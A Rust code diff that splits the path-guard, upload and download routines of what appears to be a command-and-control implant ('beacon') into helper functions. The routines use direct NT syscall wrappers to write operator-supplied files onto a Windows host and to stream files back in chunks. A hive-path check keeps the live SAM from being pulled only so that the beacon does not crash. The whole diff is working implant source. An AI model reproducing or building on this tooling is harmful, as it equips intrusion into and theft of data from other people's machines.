@@ -200,9 +200,24 @@ fn allowed(path: &str) -> bool {
     if protected_override() {
         return true;
     }
-    // Normalize: collapse runs of `/` and `\` into a single `\`, lowercase
-    // everything. This defeats double-slash tricks (`\\`, `//`) before the
-    // substring check.
+    // Normalize the path (separator + case), then collapse `.`/`..` segments
+    // so the hive check below can't be bypassed with double separators or path
+    // traversal. The per-stage reasoning lives with the stage helpers.
+    let normalized = allowed_normalize(path);
+    let segs = allowed_collapse_segments(&normalized);
+    // If the path was ALL dots/slashes (e.g. ".\\.\\\\.\\"), the clean string
+    // is empty — that means the operator tried to reach the root of a drive
+    // relative to CWD — NOT a hive path, so allow it.
+    if allowed_clean_path(&segs, &normalized).is_empty() {
+        return true;
+    }
+    allowed_hive_check(&segs)
+}
+
+/// Normalize: collapse runs of `/` and `\` into a single `\`, lowercase
+/// everything. This defeats double-slash tricks (`\\`, `//`) before the
+/// substring check.
+fn allowed_normalize(path: &str) -> crate::heap::String {
     let mut normalized = crate::heap::String::with_capacity(path.len());
     let mut last_was_slash = false;
     for c in path.chars() {
@@ -216,25 +231,28 @@ fn allowed(path: &str) -> bool {
             last_was_slash = false;
         }
     }
+    normalized
+}
 
-    // Strip `.` (current-directory) components from the normalized path so that
-    // `.\config\SAM` and `\\.\config\SAM` resolve to `\config\sam` — otherwise
-    // the leading `.\` defeats the substring check below. We split on `\`,
-    // drop every empty-or-`.` segment, and rejoin.
-    //
-    // CRITICAL: we also collapse `..` (parent-directory) segments here. Without
-    // this, a path like `C:\config\dummy\..\sam` normalizes to
-    // `\config\dummy\..\sam`, which does NOT contain `\config\sam` → the hive
-    // guard returns true → all 5 blocked hives (SAM/SYSTEM/SECURITY/SOFTWARE/
-    // DEFAULT) become reachable via path traversal, and downloading the live
-    // SAM bricks the beacon on oplock. Collapsing `..` resolves the traversal
-    // so `\config\dummy\..\sam` → `\config\sam` is correctly blocked.
-    //
-    // We track segments in a small stack-like Vec: a non-traversal segment is
-    // pushed; a `..` pops the previous segment (the parent). A leading `..` with
-    // no preceding segment is kept verbatim — on a Windows absolute path it
-    // will fail naturally at NtCreateFile, and leaving it lets the substring
-    // check apply to the literal form too.
+/// Strip `.` (current-directory) components from the normalized path so that
+/// `.\config\SAM` and `\\.\config\SAM` resolve to `\config\sam` — otherwise
+/// the leading `.\` defeats the substring check below. We split on `\`,
+/// drop every empty-or-`.` segment, and rejoin.
+///
+/// CRITICAL: we also collapse `..` (parent-directory) segments here. Without
+/// this, a path like `C:\config\dummy\..\sam` normalizes to
+/// `\config\dummy\..\sam`, which does NOT contain `\config\sam` → the hive
+/// guard returns true → all 5 blocked hives (SAM/SYSTEM/SECURITY/SOFTWARE/
+/// DEFAULT) become reachable via path traversal, and downloading the live
+/// SAM bricks the beacon on oplock. Collapsing `..` resolves the traversal
+/// so `\config\dummy\..\sam` → `\config\sam` is correctly blocked.
+///
+/// We track segments in a small stack-like Vec: a non-traversal segment is
+/// pushed; a `..` pops the previous segment (the parent). A leading `..` with
+/// no preceding segment is kept verbatim — on a Windows absolute path it
+/// will fail naturally at NtCreateFile, and leaving it lets the substring
+/// check apply to the literal form too.
+fn allowed_collapse_segments(normalized: &str) -> crate::heap::Vec<&str> {
     let mut segs: crate::heap::Vec<&str> = crate::heap::Vec::new();
     for seg in normalized.split('\\') {
         if seg.is_empty() || seg == "." {
@@ -253,9 +271,15 @@ fn allowed(path: &str) -> bool {
         }
         segs.push(seg);
     }
+    segs
+}
+
+/// Rejoin the collapsed segments into the clean path the empty-path check
+/// inspects. Capacity mirrors the original normalized string's length.
+fn allowed_clean_path(segs: &[&str], normalized: &str) -> crate::heap::String {
     let mut clean = crate::heap::String::with_capacity(normalized.len());
     let mut first = true;
-    for seg in &segs {
+    for seg in segs {
         if first {
             first = false;
         } else {
@@ -263,20 +287,18 @@ fn allowed(path: &str) -> bool {
         }
         clean.push_str(seg);
     }
-    // If the path was ALL dots/slashes (e.g. ".\\.\\\\.\\"), the clean string
-    // is empty — that means the operator tried to reach the root of a drive
-    // relative to CWD — NOT a hive path, so allow it.
-    if clean.is_empty() {
-        return true;
-    }
+    clean
+}
 
-    // Component-aware hive check: refuse only when a `config` segment is
-    // immediately followed by a hive name. This is NOT a raw substring match,
-    // so `...\config\sam.txt` or `config\default.dat` (files that merely
-    // START with a hive name) stay allowed — matching the documented
-    // no-false-positive contract. Segments are already lowercased by the
-    // normalization above, and `..`/`.`/empty segments were collapsed into
-    // `segs`, so `\config\dummy\..\sam` still resolves to `config sam`.
+/// Component-aware hive check: refuse only when a `config` segment is
+/// immediately followed by a hive name. This is NOT a raw substring match,
+/// so `...\config\sam.txt` or `config\default.dat` (files that merely
+/// START with a hive name) stay allowed — matching the documented
+/// no-false-positive contract. Segments are already lowercased by the
+/// normalization above, and `..`/`.`/empty segments were collapsed into
+/// `segs`, so `\config\dummy\..\sam` still resolves to `config sam`.
+/// Returns true when no hive pair is found (path allowed).
+fn allowed_hive_check(segs: &[&str]) -> bool {
     const HIVE_NAMES: [&str; 5] = ["sam", "system", "security", "software", "default"];
     for pair in segs.windows(2) {
         if pair[0] == "config" && HIVE_NAMES.contains(&pair[1]) {
@@ -482,83 +504,130 @@ pub fn do_upload(rt: &Runtime, name: &str, data: &[u8]) -> Response {
         return Response::Err(String::from("upload: refusing protected target"));
     }
     unsafe {
-        let handle = match open_file(
-            rt,
-            name,
-            GENERIC_WRITE,
-            FILE_OVERWRITE_IF,
-            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
-        ) {
+        let handle = match do_upload_open(rt, name) {
             Ok(h) => h,
-            Err(OpenError::BadPath) => return Response::Err(String::from("upload: invalid path")),
-            Err(OpenError::Unresolved) => {
-                return Response::Err(String::from("upload: NtCreateFile unresolved"))
-            }
-            Err(OpenError::Status(s)) => {
-                return Response::Err(String::from(format_ntstatus("upload open", s)))
-            }
+            Err(e) => return e,
         };
         // Write in CHUNK-sized blocks, advancing by the ACTUAL bytes written
-        // each call (w_iosb.information). NtWriteFile on filter drivers / pipe
-        // endpoints / near-full disks can return success with fewer bytes than
-        // requested; gating purely on nt_success() would silently truncate the
-        // file and report Response::Ok (same class of bug as the read_file
-        // short-read). Loop until the whole buffer is confirmed written. The
-        // handle was opened with FILE_SYNCHRONOUS_IO_NONALERT, so a NULL
-        // ByteOffset uses the OS-maintained current position, which advances
-        // by `information` on each write (same contract the download read loop
-        // at do_download relies on).
-        let mut off = 0usize;
-        let mut err: Option<String> = None;
-        while off < data.len() {
-            let want = (data.len() - off).min(CHUNK);
-            let mut w_iosb: IoStatusBlock = IoStatusBlock::default();
-            let wst = crate::syscalls::nt_write_file(
-                rt,
-                handle as usize,
-                0, // Event
-                0, // ApcRoutine
-                0, // ApcContext
-                &mut w_iosb as *mut IoStatusBlock as usize,
-                data.as_ptr().add(off) as usize,
-                want,
-                0, // ByteOffset (NULL ⇒ current position on the sync handle)
-                0, // Key
-            );
-            let status = match wst {
-                Some(s) => s,
-                None => {
-                    err = Some(String::from("upload: NtWriteFile unresolved"));
-                    break;
-                }
-            };
-            if !nt_success(status) {
-                err = Some(String::from(format_ntstatus("upload write", status)));
-                break;
-            }
-            let wrote = w_iosb.information; // bytes actually written this call
-            if wrote > want {
-                // Defensive: a driver should never report more than asked, but
-                // if it does, advancing by `wrote` would overrun `data`. Clamp
-                // and treat the excess as a short-write failure.
-                err = Some(String::from("upload: write over-reported bytes"));
-                break;
-            }
-            if wrote == 0 {
-                // Success but no progress: a filter driver or pipe endpoint can
-                // accept a write yet report zero bytes. Treat as a failure so we
-                // never loop forever and never report a truncated file as Ok.
-                err = Some(String::from("upload: short write (no progress)"));
-                break;
-            }
-            off += wrote;
-        }
+        // each call (see do_upload_write_all for the loop and its
+        // short-write / no-progress handling).
+        let (off, err) = do_upload_write_all(rt, handle, data);
         let _ = crate::syscalls::nt_close(rt, handle as usize);
         if off == data.len() {
             Response::Ok
         } else {
             Response::Err(err.unwrap_or_else(|| String::from("upload: short write")))
         }
+    }
+}
+
+/// Open the destination for overwrite (GENERIC_WRITE / FILE_OVERWRITE_IF),
+/// mapping the OpenError arms onto the upload error strings.
+fn do_upload_open(rt: &Runtime, name: &str) -> Result<*mut core::ffi::c_void, Response> {
+    unsafe {
+        match open_file(
+            rt,
+            name,
+            GENERIC_WRITE,
+            FILE_OVERWRITE_IF,
+            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
+        ) {
+            Ok(h) => Ok(h),
+            Err(OpenError::BadPath) => Err(Response::Err(String::from("upload: invalid path"))),
+            Err(OpenError::Unresolved) => {
+                Err(Response::Err(String::from("upload: NtCreateFile unresolved")))
+            }
+            Err(OpenError::Status(s)) => {
+                Err(Response::Err(String::from(format_ntstatus("upload open", s))))
+            }
+        }
+    }
+}
+
+/// Write `data` in CHUNK-sized blocks, advancing by the ACTUAL bytes written
+/// each call (w_iosb.information). NtWriteFile on filter drivers / pipe
+/// endpoints / near-full disks can return success with fewer bytes than
+/// requested; gating purely on nt_success() would silently truncate the
+/// file and report Response::Ok (same class of bug as the read_file
+/// short-read). Loop until the whole buffer is confirmed written. The
+/// handle was opened with FILE_SYNCHRONOUS_IO_NONALERT, so a NULL
+/// ByteOffset uses the OS-maintained current position, which advances
+/// by `information` on each write (same contract the download read loop
+/// at do_download relies on).
+///
+/// Returns the offset reached and the first error (if any); the caller
+/// decides the final verdict via `off == data.len()`.
+fn do_upload_write_all(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    data: &[u8],
+) -> (usize, Option<String>) {
+    let mut off = 0usize;
+    let mut err: Option<String> = None;
+    while off < data.len() {
+        let want = (data.len() - off).min(CHUNK);
+        match do_upload_write_chunk(rt, handle, data, off, want) {
+            Ok(wrote) => off += wrote,
+            Err(e) => {
+                err = Some(e);
+                break;
+            }
+        }
+    }
+    (off, err)
+}
+
+/// Write one CHUNK-sized block from `data[off..off+want]`, advancing by the
+/// ACTUAL bytes written (w_iosb.information). Returns the bytes written this
+/// call, or the first error. NtWriteFile on filter drivers / pipe endpoints /
+/// near-full disks can return success with fewer bytes than requested; gating
+/// purely on nt_success() would silently truncate the file and report
+/// Response::Ok (same class of bug as the read_file short-read). The handle
+/// was opened with FILE_SYNCHRONOUS_IO_NONALERT, so a NULL ByteOffset uses the
+/// OS-maintained current position, which advances by `information` on each
+/// write (same contract the download read loop at do_download relies on).
+fn do_upload_write_chunk(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    data: &[u8],
+    off: usize,
+    want: usize,
+) -> Result<usize, String> {
+    unsafe {
+        let mut w_iosb: IoStatusBlock = IoStatusBlock::default();
+        let wst = crate::syscalls::nt_write_file(
+            rt,
+            handle as usize,
+            0, // Event
+            0, // ApcRoutine
+            0, // ApcContext
+            &mut w_iosb as *mut IoStatusBlock as usize,
+            data.as_ptr().add(off) as usize,
+            want,
+            0, // ByteOffset (NULL ⇒ current position on the sync handle)
+            0, // Key
+        );
+        let status = match wst {
+            Some(s) => s,
+            None => return Err(String::from("upload: NtWriteFile unresolved")),
+        };
+        if !nt_success(status) {
+            return Err(String::from(format_ntstatus("upload write", status)));
+        }
+        let wrote = w_iosb.information; // bytes actually written this call
+        if wrote > want {
+            // Defensive: a driver should never report more than asked, but
+            // if it does, advancing by `wrote` would overrun `data`. Clamp
+            // and treat the excess as a short-write failure.
+            return Err(String::from("upload: write over-reported bytes"));
+        }
+        if wrote == 0 {
+            // Success but no progress: a filter driver or pipe endpoint can
+            // accept a write yet report zero bytes. Treat as a failure so we
+            // never loop forever and never report a truncated file as Ok.
+            return Err(String::from("upload: short write (no progress)"));
+        }
+        Ok(wrote)
     }
 }
 
@@ -574,102 +643,149 @@ pub fn do_download(rt: &Runtime, path: &str) -> Vec<Response> {
         ))];
     }
     unsafe {
-        let handle = match open_file(
+        let handle = match do_download_open(rt, path) {
+            Ok(h) => h,
+            Err(e) => return e,
+        };
+        // Stream the file in CHUNK-sized reads; the error paths inside
+        // do_download_read_all close the handle themselves and return early —
+        // only the EOF path falls through to the close below.
+        let chunks = do_download_read_all(rt, handle, path);
+        let _ = crate::syscalls::nt_close(rt, handle as usize);
+        chunks
+    }
+}
+
+/// Open the source read-only (GENERIC_READ / FILE_OPEN), mapping the
+/// OpenError arms onto the download error strings.
+fn do_download_open(rt: &Runtime, path: &str) -> Result<*mut core::ffi::c_void, Vec<Response>> {
+    unsafe {
+        match open_file(
             rt,
             path,
             GENERIC_READ,
             FILE_OPEN,
             FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
         ) {
-            Ok(h) => h,
+            Ok(h) => Ok(h),
             Err(OpenError::BadPath) => {
-                return vec![Response::Err(String::from("download: invalid path"))]
+                Err(vec![Response::Err(String::from("download: invalid path"))])
             }
-            Err(OpenError::Unresolved) => {
-                return vec![Response::Err(String::from(
-                    "download: NtCreateFile unresolved",
-                ))]
-            }
+            Err(OpenError::Unresolved) => Err(vec![Response::Err(String::from(
+                "download: NtCreateFile unresolved",
+            ))]),
             Err(OpenError::Status(s)) => {
                 let msg = if s == STATUS_OBJECT_NAME_NOT_FOUND {
                     "download: not found"
                 } else {
                     "download open"
                 };
-                return vec![Response::Err(String::from(format_ntstatus(msg, s)))];
+                Err(vec![Response::Err(String::from(format_ntstatus(msg, s)))])
             }
-        };
-
-        // Read in CHUNK-sized blocks until STATUS_END_OF_FILE.
-        let mut chunks: Vec<Response> = Vec::new();
-        let mut buf = crate::heap::vec![0u8; CHUNK];
-        let name = basename(path);
-        let mut seq = 0u32;
-        loop {
-            let mut read_iosb: IoStatusBlock = IoStatusBlock::default();
-            let rst = crate::syscalls::nt_read_file(
-                rt,
-                handle as usize,
-                0,
-                0,
-                0,
-                &mut read_iosb as *mut IoStatusBlock as usize,
-                buf.as_mut_ptr() as usize,
-                CHUNK as usize,
-                0, // ByteOffset (NULL ⇒ current position)
-                0, // Key
-            );
-            let status = match rst {
-                Some(s) => s,
-                None => {
-                    let _ = crate::syscalls::nt_close(rt, handle as usize);
-                    return vec![Response::Err(String::from(
-                        "download: NtReadFile unresolved",
-                    ))];
-                }
-            };
-            let got = read_iosb.information; // bytes actually read
-                                             // EOF reached. STATUS_END_OF_FILE is success-ish for NtReadFile at
-                                             // the end of a file (NOT an error), and a 0-length read likewise
-                                             // means the stream is drained.
-            if status == STATUS_END_OF_FILE || got == 0 {
-                // EOF. If we never produced a chunk (empty file), emit one empty
-                // EOF chunk so the operator sees completion.
-                if chunks.is_empty() {
-                    chunks.push(Response::FileChunk {
-                        name,
-                        seq: 0,
-                        eof: 1,
-                        data: Vec::new(),
-                    });
-                } else if let Some(Response::FileChunk { eof, .. }) = chunks.last_mut() {
-                    *eof = 1; // mark the last chunk as EOF
-                }
-                break;
-            }
-            // A non-EOF negative status is a real read error (e.g. a transient
-            // STATUS_FILE_LOCK_CONFLICT). Don't push a partial/stale chunk and
-            // pretend success — surface the error so the operator knows the
-            // download was truncated, and close the handle.
-            if status < 0 {
-                let _ = crate::syscalls::nt_close(rt, handle as usize);
-                return vec![Response::Err(String::from(format_ntstatus(
-                    "download read",
-                    status,
-                )))];
-            }
-            let got = got.min(CHUNK);
-            chunks.push(Response::FileChunk {
-                name: name.clone(),
-                seq,
-                eof: 0,
-                data: buf[..got].to_vec(),
-            });
-            seq += 1;
-            // A short read means the next read will hit EOF — loop once more.
         }
-        let _ = crate::syscalls::nt_close(rt, handle as usize);
-        chunks
+    }
+}
+
+/// Read the file in CHUNK-sized blocks until STATUS_END_OF_FILE, streaming
+/// one `Response::FileChunk` per block (128 KiB). An empty file yields a
+/// single empty chunk with eof=1 (matches the dev agent); the last chunk is
+/// marked eof=1. On read errors the handle is closed here and the error
+/// returned; on EOF the caller closes the handle.
+fn do_download_read_all(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    path: &str,
+) -> Vec<Response> {
+    let mut chunks: Vec<Response> = Vec::new();
+    let mut buf = crate::heap::vec![0u8; CHUNK];
+    let name = basename(path);
+    let mut seq = 0u32;
+    loop {
+        // One NtReadFile fill; unresolved reads close the handle and return.
+        let (status, got) = match do_download_read(rt, handle, &mut buf) {
+            Ok(r) => r,
+            Err(e) => return e,
+        };
+        // EOF reached. STATUS_END_OF_FILE is success-ish for NtReadFile at
+        // the end of a file (NOT an error), and a 0-length read likewise
+        // means the stream is drained.
+        if status == STATUS_END_OF_FILE || got == 0 {
+            do_download_mark_eof(&mut chunks, &name);
+            break;
+        }
+        // A non-EOF negative status is a real read error (e.g. a transient
+        // STATUS_FILE_LOCK_CONFLICT). Don't push a partial/stale chunk and
+        // pretend success — surface the error so the operator knows the
+        // download was truncated, and close the handle.
+        if status < 0 {
+            unsafe {
+                let _ = crate::syscalls::nt_close(rt, handle as usize);
+            }
+            return vec![Response::Err(String::from(format_ntstatus(
+                "download read",
+                status,
+            )))];
+        }
+        let got = got.min(CHUNK);
+        chunks.push(Response::FileChunk {
+            name: name.clone(),
+            seq,
+            eof: 0,
+            data: buf[..got].to_vec(),
+        });
+        seq += 1;
+        // A short read means the next read will hit EOF — loop once more.
+    }
+    chunks
+}
+
+/// EOF handling for the download loop: if no chunk was ever produced (empty
+/// file), emit one empty EOF chunk so the operator sees completion; otherwise
+/// mark the last chunk as EOF.
+fn do_download_mark_eof(chunks: &mut Vec<Response>, name: &String) {
+    if chunks.is_empty() {
+        chunks.push(Response::FileChunk {
+            name: name.clone(),
+            seq: 0,
+            eof: 1,
+            data: Vec::new(),
+        });
+    } else if let Some(Response::FileChunk { eof, .. }) = chunks.last_mut() {
+        *eof = 1; // mark the last chunk as EOF
+    }
+}
+
+/// Issue one NtReadFile into `buf`, returning (status, bytes-read). On an
+/// unresolved NtReadFile the handle is closed here and the error vector
+/// returned (mirrors the original loop's cleanup).
+fn do_download_read(
+    rt: &Runtime,
+    handle: *mut core::ffi::c_void,
+    buf: &mut [u8],
+) -> Result<(i32, usize), Vec<Response>> {
+    unsafe {
+        let mut read_iosb: IoStatusBlock = IoStatusBlock::default();
+        let rst = crate::syscalls::nt_read_file(
+            rt,
+            handle as usize,
+            0,
+            0,
+            0,
+            &mut read_iosb as *mut IoStatusBlock as usize,
+            buf.as_mut_ptr() as usize,
+            CHUNK as usize,
+            0, // ByteOffset (NULL ⇒ current position)
+            0, // Key
+        );
+        match rst {
+            Some(s) => Ok((s, read_iosb.information)), // bytes actually read
+            None => {
+                let _ = crate::syscalls::nt_close(rt, handle as usize);
+                Err(vec![Response::Err(String::from(
+                    "download: NtReadFile unresolved",
+                ))])
+            }
+        }
     }
 }
 
